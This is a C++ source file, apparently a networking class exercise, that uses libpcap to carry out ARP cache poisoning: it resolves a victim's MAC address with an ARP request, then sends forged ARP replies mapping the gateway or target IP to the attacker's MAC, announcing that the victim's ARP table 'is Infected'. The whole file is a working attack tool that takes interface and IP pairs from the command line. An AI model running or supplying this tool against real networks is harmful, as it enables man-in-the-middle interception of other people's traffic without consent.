#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <fstream>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#include <iostream>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)

#define MAC_ALEN 6
#define ARP_SIZE 42

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("example: send-arp-test wlan0 192.168.10.2 192.168.10.1\n");
}

//Generated By GPT o3-mini-high source:https://stackoverflow.com/questions/17909401/linux-c-get-default-interfaces-ip-address
bool get_ip(char* dev, char* ip) {
	struct ifreq ifr;
	int sfd = socket(AF_INET, SOCK_DGRAM, 0),ret;
	if(sfd < 0){
		printf("Faile to get interface MAC address - socket() failed - %m\n");
		return false;
	}

	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	ret = ioctl(sfd, SIOCGIFADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
		close(sfd);
		return false;
	}
	
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ip, 4*Ip::SIZE);
	close(sfd);
	return true;
}

bool get_mac(char* dev, char* mac) {
	struct ifreq ifr;
	int sfd = socket(AF_INET, SOCK_DGRAM, 0),ret;
	if(sfd < 0){
		printf("Faile to get interface MAC address - socket() failed - %m\n");
		return false;
	}

	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	ret = ioctl(sfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
		close(sfd);
		return false;
	}

	u_int8_t tmp[20];
	memcpy(tmp, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
	sprintf(mac,"%02x:%02x:%02x:%02x:%02x:%02x", tmp[0], tmp[1], tmp[2], tmp[3], tmp[4], tmp[5]);
	close(sfd);
	return true;
}
void attack(char* dev, char* sender, char* target){

	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}
	
	// Calculate Attacke IP Addr
	char aip[20]={0,};
	if (get_ip(dev, aip)) {
		printf("Attacker IP address: %s\n", aip);
	} else {
		printf("couldn't get Attacker's IP address\n");
		return;
	}
	// Calculate Attacker Mac Addr
	char amac[20]={0,};
	if (get_mac(dev, amac)) {
		printf("Attacker MAC address: %s\n", amac);
	} else {
		printf("couldn't get Attacker's MAC address\n");
		return;
	}


	EthArpPacket packet;
	
	////////////////////////////////////////////
	////////// Find Target Mac Addr //////////
	////////////////////////////////////////////

	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");		
	packet.eth_.smac_ = Mac(amac);						// Attacker MAC
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(amac);						// Attacker MAC
	packet.arp_.sip_ = htonl(Ip(aip));					// Attacker IP
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");		
	packet.arp_.tip_ = htonl(Ip(sender));				// Sender IP
	/*/////////                                        //////////*/
	
	// Send Packet
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		exit(1);
	}
	
	// Capture Packet
	struct pcap_pkthdr *pkt_header;
	const u_char *pkt_data;
	EthHdr* eth;
	ArpHdr* arp; std::string arp_sip;

	do{
		res = pcap_next_ex(handle, &pkt_header, &pkt_data);
		if (res != 1) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
			return;
		}
		eth = (EthHdr*) pkt_data;
		arp = (ArpHdr*) (pkt_data + sizeof(EthHdr));
		arp_sip = std::string(arp->sip());
	}while(eth->type() != EthHdr::Arp || arp->op() != ArpHdr::Reply || arp_sip.compare(sender) != 0);
	

	std::string smac = std::string(arp->smac());
	printf("Sender MAC address: %s\n", smac.c_str());
	
	pcap_close(handle);
	
	printf("\n\n****Sender Mac Addr Capture Success!****\n\n");
	
	//////////////////////////////////////
	////////// ARP Table Attack //////////
	//////////////////////////////////////
	
	pcap_t* handle_attack = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle_attack == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}
	
	
	//////////*         Packet Header Structure         *//////////
	packet.eth_.dmac_ = Mac(smac);			// Sender Mac
	packet.eth_.smac_ = Mac(amac);  		// Attacker Mac
	packet.eth_.type_ = htons(EthHdr::Arp);
	
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(amac);			// Attacker Mac
	packet.arp_.sip_ = htonl(Ip(target));   // Target IP
	packet.arp_.tmac_ = Mac(smac);			// Sender Mac
	packet.arp_.tip_ = htonl(Ip(sender));   // Sender IP
	/*/////////                                        //////////*/
	
	
	// Send Packet
	res = pcap_sendpacket(handle_attack, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle_attack));
		return;
	}
	
	pcap_close(handle_attack);
	printf("\n\n****Sender's ARP Table is Infected!****\n\n");
}

int main(int argc, char* argv[]) {
	
	if (argc%2 != 0 || argc < 4) {
		usage();
		return -1;
	}
	for(int i = 2; i < argc; i += 2) {
		attack(argv[1], argv[i], argv[i+1]);
	}
}
